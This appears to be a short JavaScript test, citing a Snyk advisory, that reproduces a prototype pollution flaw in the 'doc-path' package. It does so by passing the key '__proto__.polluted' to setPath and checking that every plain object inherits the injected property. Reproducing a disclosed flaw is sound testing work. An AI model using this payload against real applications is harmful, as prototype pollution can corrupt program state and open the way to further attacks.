//https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
test("prototype pollution in doc-path", () => {
  const path = require("doc-path");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  path.setPath({}, "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
